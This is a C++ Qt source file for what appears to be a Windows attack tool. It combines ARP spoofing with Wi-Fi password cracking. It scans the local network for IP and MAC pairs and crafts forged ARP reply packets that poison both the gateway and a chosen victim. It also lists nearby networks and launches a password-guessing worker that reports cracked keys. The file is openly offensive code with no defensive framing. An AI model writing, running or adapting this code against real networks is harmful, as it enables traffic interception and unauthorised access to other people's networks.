#include "widget.h"
#include "./ui_widget.h"
#include <QDebug>
#include <QThread>
#include <QThreadPool>
#include <pcap.h>
#include <iphlpapi.h>

Widget::Widget(QWidget *parent)
    :  m_wifi_count(0), QWidget(parent),
        ui(new Ui::Widget)
{
    ui->setupUi(this);

    m_arp_messageBox = new QMessageBox(this);
    m_wifi_messageBox = new QMessageBox(this);

    m_wifiListModel = new QStringListModel();
    m_pyProcessForArp = new QProcess(this);
    m_currentWifiProcess = new QProcess(this);
    packet_to_send_to_Gateway = new ArpPacket();
    packet_to_send_to_targetIp = new ArpPacket();

    m_wifiCrackerWorker = nullptr;
    pcap_ifaceName = "";
    ui->operation_output_TextEdit->setFontWeight(QFont::Bold);
    ui->wifiCrackingOperationTextEdit->setFontWeight(QFont::Bold);
    m_arp_spoofing_is_running = false;
    m_wifi_cracking_is_running = false;
    ui->operation_output_TextEdit->setFontItalic(true);
    ui->wifiCrackingOperationTextEdit->setFontItalic(true);

    ui->stopButton->setEnabled(false);
    ui->stopWifiCrackingButton->setEnabled(false);
    ui->startButton->setEnabled(false);
    ui->wifiCrackerButton->setEnabled(false); //avoir apres
    m_program_in_using = "python";

    my_ip = "";
    QNetworkInterface activeInterface;
    m_interface_name = "";
    refreshMyAddressInfo();
   /* foreach(QNetworkInterface netinterface, QNetworkInterface::allInterfaces())
    {
        if (netinterface.flags().testFlag(QNetworkInterface::IsUp) && !netinterface.flags().testFlag(QNetworkInterface::IsLoopBack)){
            foreach (QNetworkAddressEntry entry, netinterface.addressEntries())
            {
                if ( netinterface.hardwareAddress() != "00:00:00:00:00:00" && entry.ip().toString().contains(".") && !netinterface.humanReadableName().contains("VM"))
                    //interface.name(); + " "+ entry.ip().toString() +" " + interface.hardwareAddress();
                    //activeInterface.interfaceFromName(interface.name());
                    m_interface_name = netinterface.name();
                qDebug() << "interface name" << netinterface.humanReadableName().toStdString();
            }
        }

    }*/

/*
    qDebug() << "------------------------------------------------------";
    qDebug() << "-------------------------------------------------------";
    qDebug() << "-------------------------------------------------------";*/


    m_list.clear();
    m_list.append("SSID NAME : " + getCurrentConnectedWifiSsid() + " YOU ARE CONNECTED TO THIS NETWORK");
    ui->wifiCrackercomboBox->clear();

    m_wifiListModel->setStringList(m_list);

    ui->wifiListView->setModel(m_wifiListModel);
    connect(ui->startButton, &QPushButton::clicked, this, &Widget::startButton_clicked);
    connect(ui->wifiCrackerButton, &QPushButton::clicked, this, &Widget::wifiCrackerButton_clicked);
    connect(ui->stopButton, &QPushButton::clicked, this, &Widget::stopButton_clicked);
    connect(ui->stopWifiCrackingButton, &QPushButton::clicked, this, &Widget::stopWifiCrackingButton_clicked);
    connect(ui->refreshButton, &QPushButton::clicked, this, &Widget::refreshButton_clicked);
    connect(ui->reloadMyInfoButton, &QPushButton::clicked, this, &Widget::reloadMyInfoButton_clicked);
    connect(ui->wifiRescanButton, &QPushButton::clicked, this, &Widget::wifiRescanButton_clicked);

    connect(ui->target_ip_comboBox, &QComboBox::currentTextChanged, this, &Widget::targetMacChanged);
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /// \brief connect the different slots to spoofing thread signals
    ///



    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /// \brief connect wifi scanner to get all available wifi and refresh every 20 second
    ///
    m_wifi_scanner = new WifiScanner(this);
    QThreadPool::globalInstance()->start(m_wifi_scanner);


    //m_timer = new QTimer(this);
   // connect(m_timer, &QTimer::timeout, m_wifi_scanner, &WifiScanner::scan_wifi_network);
    //m_wifi_scanner->scan_wifi_network();
    //m_timer->start(20000);


}

Widget::~Widget()
{
    stopArpSpoofingThread();
    stopWifiCrackerThread();


    delete packet_to_send_to_Gateway;
    delete packet_to_send_to_targetIp;
    delete ui;
}

QString Widget::getGatewayIp()
{
    QStringList arg = QStringList() << "get_gateway_ip.py";
    m_pyProcessForArp->start(m_program_in_using, arg);
    m_pyProcessForArp->waitForFinished();
    QByteArray passerelleIpRawData = m_pyProcessForArp->readAllStandardOutput();
    QString passerelleIpData = QString(passerelleIpRawData);
    m_pyProcessForArp->close();
    return passerelleIpData;
}

QString Widget::getGatewayMac()
{
    if(m_gateway_ip != QString("error"))
    {
        QStringList arg = QStringList() << "get_gateway_mac.py" << m_gateway_ip;
        m_pyProcessForArp->start(m_program_in_using, arg);
        m_pyProcessForArp->waitForFinished();
        QByteArray passerelleMacRawData = m_pyProcessForArp->readAllStandardOutput();
        QString passerelleMacData = QString(passerelleMacRawData);
        return passerelleMacData;
    }
    return QString("error");
}

QString Widget::getMyMac(const QString ip)
{
    if(ip != QString("error"))
    {

        QStringList arg = QStringList() << "get_gateway_mac.py" << ip;
        m_pyProcessForArp->start(m_program_in_using, arg);
        m_pyProcessForArp->waitForFinished();
        QByteArray myMacRawData = m_pyProcessForArp->readAllStandardOutput();
        QString myMacData = QString(myMacRawData);
        return myMacData;
    }
    return QString("error");
}

QString Widget::getAllIpMac(QString ip_range, int& length){
        QStringList arg = QStringList() << "get_all_mac_ip.py" << ip_range;
        m_pyProcessForArp->start(m_program_in_using, arg);
        m_pyProcessForArp->waitForFinished();
        QByteArray allMacRawData = m_pyProcessForArp->readAllStandardOutput();
        QString allMacData = QString(allMacRawData);
        m_list_of_address.clear();
        QList<QString> splitarray = allMacData.split('\n');
        for(auto& info : splitarray){
            QVector<QString> splitinfo = info.split(' ');
            QString previous_key;
            for(int i=0; i<splitinfo.size(); i++){
                if(splitinfo[i].contains('\r')){
                    splitinfo[i].removeLast();

                }
                else{
                    if(splitinfo[i] != "" && splitinfo[i] != my_ip && splitinfo[i] != ui->gateway_ip_label->text()){
                        ui->target_ip_comboBox->addItem(splitinfo[i]);
                        previous_key = splitinfo[i];
                    }

                }
                if(i%2 != 0 && !splitinfo.empty() && splitinfo[i] != my_mac && splitinfo[i] != ui->gateway_mac_label->text()){
                    m_list_of_address.insert(previous_key, splitinfo[i]);
                }

            }

        }
        for(auto [key, value] : m_list_of_address.asKeyValueRange()){
            if(key == ui->target_ip_comboBox->currentText()){
                ui->target_mac_label->setText(m_list_of_address.value(key));
            }
        }

        length = m_list_of_address.size();
        return allMacData;
}

void Widget::stopArpSpoofingThread()
{
    if(m_spoofingWorker!=nullptr && m_spoofingWorker->isRunning()){
        m_spoofingWorker->quit();
        m_arp_spoofing_is_running = false;
    }
}

void Widget::stopWifiCrackerThread()
{

}

pcap_if_t *Widget::getInterfaceByIP()
{
    pcap_if_t *alldevs, *selected_iface = nullptr;
    char errbuf[PCAP_ERRBUF_SIZE];

    // Récupérer toutes les interfaces disponibles
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        qDebug()<< "Erreur pcap_findalldevs : " << errbuf;
        return nullptr;
    }

    // Vérifier si une interface a cette adresse IP
    for (pcap_if_t *d = alldevs; d != nullptr; d = d->next) {
        for (pcap_addr_t *a = d->addresses; a != nullptr; a = a->next) {
            if (a->addr && a->addr->sa_family == AF_INET) {  // IPv4 uniquement
                sockaddr_in *sin = (sockaddr_in*)a->addr;
                QString ifaceIP = QString::fromStdString(inet_ntoa(sin->sin_addr));

                if (ifaceIP == my_ip) {
                    selected_iface = d;
                    break;
                }
            }
        }
        if (selected_iface) break;
    }

    if (!selected_iface) {
    }

    pcap_freealldevs(alldevs);
    return selected_iface;
}

void Widget::convertIpAddress(const QString &ipString, uint8_t ipBytes[])
{
    QHostAddress address(ipString);
    if (address.protocol() == QAbstractSocket::IPv4Protocol) {
        quint32 ipInt = address.toIPv4Address();  // Convertir en uint32
        ipBytes[0] = (ipInt >> 24) & 0xFF;  // Premier octet
        ipBytes[1] = (ipInt >> 16) & 0xFF;  // Deuxième octet
        ipBytes[2] = (ipInt >> 8) & 0xFF;   // Troisième octet
        ipBytes[3] = ipInt & 0xFF;    // Copier dans un tableau
    } else {
        qDebug() << "Erreur: Adresse IP invalide.";
    }
}

void Widget::refreshOtherAddressInfo()
{
    m_list_of_address.clear();
    ui->target_ip_comboBox->clear();

    if(m_gateway_ip != QString("error") && m_gateway_ip != QString("")){
        int length = 0;
        getAllIpMac(m_gateway_ip + "/24", length);
       // qDebug() << "lenght " << length;
        if(length>0){
             ui->startButton->setEnabled(true);
        }
    }
    else{
        m_arp_messageBox->setText("You are not connected to any network but you can click on reload my info otherwise and then click on refresh interface");
        m_arp_messageBox->exec();
    }

}

void Widget::refreshMyAddressInfo()
{

    m_gateway_ip = getGatewayIp();
    QList<QHostAddress> allAddressList = QNetworkInterface::allAddresses();
    for(const QHostAddress &address : std::as_const(allAddressList)){
        if(address.protocol() == QAbstractSocket::IPv4Protocol && address != QHostAddress(QHostAddress::LocalHost)){
            //declaration et assignation des variables intermédiaires
            QString address_value = address.toString();
            QString gateway_value = m_gateway_ip;

            int dotaddresslastindex = address_value.lastIndexOf(".");
            int dot_gateway_ip_lastindex = gateway_value.lastIndexOf(".");

            int adrlength = address_value.size() - 1;
            int gateway_length = gateway_value.size() - 1;

            QString addresscompare = address_value.remove(dotaddresslastindex, adrlength);
            QString gatewaycompare = gateway_value.remove(dot_gateway_ip_lastindex, gateway_length);

            if(addresscompare == gatewaycompare){
                my_ip = address.toString();
                my_mac = getMyMac(my_ip);
                break;
            }


        }
    }
    allAddressList.clear();
    pcap_iface = getInterfaceByIP();
    if(pcap_iface != nullptr){
        pcap_ifaceName = QString(pcap_iface->name);

        if(m_gateway_ip == QString("error") && m_gateway_ip == QString(""))
        {
            pcap_iface = nullptr;
            m_arp_messageBox->setText("You are not connected to any network but you can click on reload my info otherwise");
            m_arp_messageBox->exec();

        }

        else{
            ui->gateway_ip_label->setText(m_gateway_ip);
            ui->gateway_mac_label->setText(getGatewayMac());
            ui->my_ip_label->setText(my_ip);
            ui->my_mac_label->setText(my_mac);
        }
    }
    else{
        m_arp_messageBox->setText("Cannot get your wifi interface please refresh");
        m_arp_messageBox->exec();
    }
    //qDebug() << "pcap iface name "<<pcap_ifaceName;


}

QString Widget::getCurrentConnectedWifiSsid()
{
    m_currentWifiProcess->start("netsh", QStringList() << "wlan" << "show" << "interfaces");
    m_currentWifiProcess->waitForFinished();
    QByteArray rawData = m_currentWifiProcess->readAllStandardOutput();
    QString rawdataString =  QString(rawData);
    QStringList dataline = rawdataString.split("\n");
    const auto& lines = dataline;
    for(const QString& line : lines){
        if(line.trimmed().startsWith("SSID")){
            QString SSID = line.section(":",1).trimmed();
            if(SSID.isEmpty() == false){
                return SSID;
            }

        }
    }
    return QString("");
}

void Widget::reScanWifi()
{
    m_list.clear();
    m_list.append("SSID NAME : " + getCurrentConnectedWifiSsid() + " YOU ARE CONNECTED TO THIS NETWORK");
    ui->wifiCrackercomboBox->clear();
    m_wifi_count = 0;
    m_wifi_scanner = new WifiScanner(this);
    QThreadPool::globalInstance()->start(m_wifi_scanner);
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// \brief slot to get wifi ssid list from wifiscanner
///
void Widget::getAvailableWifiNetwork(QString ssid, QString signal)
{
    if(ssid != "" && ssid != getCurrentConnectedWifiSsid()){
        m_list.append("SSID NAME : " + ssid + " Signal Strength : " + signal + "%");
        m_wifiListModel->setStringList(m_list);
        ui->wifiCrackercomboBox->addItem(ssid);
        m_wifi_count++;
    }
    if(m_wifi_count > 0){
        ui->wifiCrackerButton->setEnabled(true);
    }
}

void Widget::wifiRescanButton_clicked()
{
    reScanWifi();
}

void Widget::wifiResultOPeration(bool value, QString passwordValue, bool final)
{
    if(value && final){
        const QRgb rgb = 0xff00cc00;
        ui->wifiCrackingOperationTextEdit->setTextColor(QColor(rgb));
        ui->wifiCrackingOperationTextEdit->append("Password find : " + passwordValue);
        m_wifiCrackerWorker->wifiCrackingPause();
        ui->wifiCrackerButton->setEnabled(true);
        ui->stopWifiCrackingButton->setEnabled(false);
        ui->startButton->setEnabled(true);
        ui->stopButton->setEnabled(false);
        refreshMyAddressInfo();
        m_list_of_address.clear();
        ui->target_ip_comboBox->clear();
        reScanWifi();

    }
    else if(!value && final){
        const QRgb rgb = 0xff990000;
        ui->wifiCrackingOperationTextEdit->setTextColor(QColor(rgb));
       ui->wifiCrackingOperationTextEdit->append("tested with : " + passwordValue + " but not succeed");
    }
    else{
        const QRgb rgb = 0xff990000;
        ui->wifiCrackingOperationTextEdit->setTextColor(QColor(rgb));
        ui->wifiCrackingOperationTextEdit->append("Nothing found");
        m_wifiCrackerWorker->wifiCrackingPause();
        ui->wifiCrackerButton->setEnabled(true);
        ui->stopWifiCrackingButton->setEnabled(false);
        ui->startButton->setEnabled(true);
        ui->stopButton->setEnabled(false);
    }
}

void Widget::spoofingThreadStarted()
{
    const QRgb rgb = 0xff990000;
    ui->wifiCrackingOperationTextEdit->setTextColor(QColor(rgb));
    ui->wifiCrackingOperationTextEdit->append("Wifi Password Cracking socket disconnected");
}

void Widget::spoofingThreadStatus(bool value)
{
    if(value){
        const QRgb rgb = 0xff990000;
        ui->operation_output_TextEdit->setTextColor(QColor(rgb));
        ui->operation_output_TextEdit->append("Spoofing Server Thread is paused");
    }
    else{
        const QRgb rgb = 0xff00cc00;
        ui->operation_output_TextEdit->setTextColor(QColor(rgb));
        ui->operation_output_TextEdit->append("Spoofing Server Thread is running");
    }
}

void Widget::spoofingResultOPeration(bool value)
{
    if(value){
        m_arp_spoofing_is_running = true;
        const QRgb rgb = 0xff00cc00;
        ui->operation_output_TextEdit->setTextColor(QColor(rgb));
        ui->operation_output_TextEdit->append("Spoofing on packet sent successfully : " + m_selectedip);
    }
    else{
        const QRgb rgb = 0xff990000;
        ui->operation_output_TextEdit->setTextColor(QColor(rgb));
        ui->operation_output_TextEdit->append("Error on sending packet to : " + m_selectedip);
    }
}

void Widget::spoofingThreadStopped()
{

}
void Widget::refreshButton_clicked()
{

    refreshOtherAddressInfo();
}

void Widget::reloadMyInfoButton_clicked()
{
    refreshMyAddressInfo();
}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// \brief Toutes les methodes qui se trouve ci-dessous sont exclusivement utilise pour le Wifi Cracking
///15E567EA6C91


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// \brief Fin des methodes utilise pour le Wifi Cracking
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// \brief Toutes les methodes qui se trouve ci-dessous sont exclusivement utilise pour le Arp Spoofing
///15E567EA6C91

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/// \brief Fin des methodes utilise pour le Arp Spoofing
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////






void Widget::wifiCrackerButton_clicked()
{
    m_selectedssid = "";
    m_selectedssid = ui->wifiCrackercomboBox->currentText();
    ui->wifiCrackerButton->setEnabled(false);
    ui->stopWifiCrackingButton->setEnabled(true);
    ui->stopButton->setEnabled(false);
    ui->startButton->setEnabled(false);
    if(m_selectedssid != ""){
        if(m_arp_spoofing_is_running){
            stopArpSpoofingThread();
            pcap_iface = nullptr;
        }

        if(m_wifiCrackerWorker == nullptr){
            m_wifiCrackerWorker = new wifiCrackerWorker(m_selectedssid, this);
        }
        else{
            m_wifiCrackerWorker->setSSid(m_selectedssid);
        }
        connect(m_wifiCrackerWorker, &wifiCrackerWorker::wifiResultOperation, this, &Widget::wifiResultOPeration);
        m_wifiCrackerWorker->start();
    }
    else{
        ui->wifiCrackerButton->setEnabled(true);
        ui->stopWifiCrackingButton->setEnabled(false);
        ui->startButton->setEnabled(true);
        m_arp_messageBox->setText("No wifi ssid provided");
        m_arp_messageBox->exec();
    }
}

void Widget::startButton_clicked()
{
    if(pcap_iface != nullptr){
        ui->startButton->setEnabled(false);
        ui->stopButton->setEnabled(true);
        ui->wifiCrackerButton->setEnabled(false);
        ui->stopWifiCrackingButton->setEnabled(false);
        memset(packet_to_send_to_Gateway, 0, sizeof(*packet_to_send_to_Gateway));
        memset(packet_to_send_to_targetIp, 0, sizeof(*packet_to_send_to_targetIp));
        m_selectedip = ui->target_ip_comboBox->currentText();
        QVector<QString> gatewayMac = ui->gateway_mac_label->text().split(':');
        QVector<QString> srcMac = my_mac.split(':');
        QVector<QString> targetMac = ui->target_mac_label->text().split(':');
        convertIpAddress(m_selectedip, packet_to_send_to_Gateway->sender_ip);
        convertIpAddress(m_gateway_ip, packet_to_send_to_targetIp->sender_ip);

        bool ok;
        size_t i = 0;

        for(auto & data : gatewayMac){
            packet_to_send_to_Gateway->target_mac[i] = data.toUInt(&ok, 16);
            packet_to_send_to_Gateway->dest_mac[i] = data.toUInt(&ok, 16);

            i++;
        }

        i = 0;
        for(auto & data : targetMac){
            packet_to_send_to_targetIp->target_mac[i] = data.toUInt(&ok, 16);
            packet_to_send_to_targetIp->dest_mac[i] = data.toUInt(&ok, 16);

            i++;
        }

        i = 0;
        for(auto & data : srcMac){
            packet_to_send_to_Gateway->src_mac[i] = data.toUInt(&ok, 16);
            packet_to_send_to_Gateway->sender_mac[i] = data.toUInt(&ok, 16);

            packet_to_send_to_targetIp->src_mac[i] = data.toUInt(&ok, 16);
            packet_to_send_to_targetIp->sender_mac[i] = data.toUInt(&ok, 16);

            i++;
        }

        packet_to_send_to_Gateway->eth_type = htons(0x0806);
        packet_to_send_to_Gateway->htype = htons(1);
        packet_to_send_to_Gateway->hlen = 6;
        packet_to_send_to_Gateway->plen = 4;
        packet_to_send_to_Gateway->operation = htons(2);
        packet_to_send_to_Gateway->ptype = htons(0x0800);

        packet_to_send_to_targetIp->eth_type = htons(0x0806);
        packet_to_send_to_targetIp->htype = htons(1);
        packet_to_send_to_targetIp->hlen = 6;
        packet_to_send_to_targetIp->plen = 4;
        packet_to_send_to_targetIp->operation = htons(2);
        packet_to_send_to_targetIp->ptype = htons(0x0800);

        if(SpoofingWorker::count == 0){
            m_spoofingWorker = new SpoofingWorker(pcap_ifaceName, m_gateway_ip, m_selectedip, *packet_to_send_to_Gateway, *packet_to_send_to_targetIp, this);
            connect(m_spoofingWorker, &SpoofingWorker::started, this, &Widget::spoofingThreadStarted);
            connect(m_spoofingWorker, &SpoofingWorker::finished, this, &Widget::spoofingThreadStopped);
            connect(m_spoofingWorker, &SpoofingWorker::spoofingThreadStatus, this, &Widget::spoofingThreadStatus);
            connect(m_spoofingWorker, &SpoofingWorker::spoofingResultOperation, this, &Widget::spoofingResultOPeration);
            m_spoofingWorker->start();
        }
        else{
            m_spoofingWorker->setTargetIp(m_selectedip);
            m_spoofingWorker->resume();
        }
        qDebug() << packet_to_send_to_Gateway->sender_ip[0];
        qDebug() << packet_to_send_to_Gateway->sender_ip[1];
        qDebug() << packet_to_send_to_Gateway->sender_ip[2];
        qDebug() << packet_to_send_to_Gateway->sender_ip[3];
    }
    else{
        m_arp_messageBox->setText("Cannot get your wifi interface please refresh");
        m_arp_messageBox->exec();
    }

}


void Widget::stopWifiCrackingButton_clicked()
{
    m_wifiCrackerWorker->wifiCrackingPause();
    ui->stopWifiCrackingButton->setEnabled(false);
    ui->wifiCrackerButton->setEnabled(true);
    ui->startButton->setEnabled(true);
    ui->stopButton->setEnabled(false);
}

void Widget::stopButton_clicked()
{
    //sendStopToArpSpoofingServer();
    m_spoofingWorker->pause();
    ui->startButton->setEnabled(true);
    ui->stopButton->setEnabled(false);
    ui->wifiCrackerButton->setEnabled(true);
    ui->stopWifiCrackingButton->setEnabled(false);
}

void Widget::targetMacChanged(const QString &value)
{
    for(auto [key, valeur] : m_list_of_address.asKeyValueRange()){
        if(key == value){
            ui->target_mac_label->setText(m_list_of_address.value(key));
        }
    }
}


